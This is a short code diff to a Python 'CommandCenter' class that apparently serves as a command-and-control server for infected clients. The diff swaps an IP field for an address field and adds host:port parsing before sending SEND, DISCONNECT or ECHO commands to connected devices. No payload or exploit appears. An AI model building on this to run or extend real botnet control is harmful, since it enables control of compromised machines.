@@ -49,13 +49,13 @@ class CommandCenter():
             return
         ###what happans when you send the packet. Does the server communicate back to the infecting client?
         if command == "SEND" and optional != None:
-            packet = self.construct_packet(device.ip, command, optional)
+            packet = self.construct_packet(device.address, command, optional)
             device.send_message(optional)
         elif command == "DISCONNECT":
-            packet = self.construct_packet(device.ip, command, optional)
+            packet = self.construct_packet(device.address, command, optional)
             device.close()
         else:
-            packet = self.construct_packet(device.ip, command, optional)
+            packet = self.construct_packet(device.address, command, optional)
             device.send_message("ECHO")
 
     def command(self, addr, command, optional=None):
@@ -67,6 +67,8 @@ class CommandCenter():
             for i in self.client_list:
                 self.excute_command(i,command,optional)
         else:
+            addr = addr.split(":", 1)
+            addr[1] = int(addr[1])
             client = locateBy_(addr)
             if(client != None):
                 self.excute_command(client, command,optional)
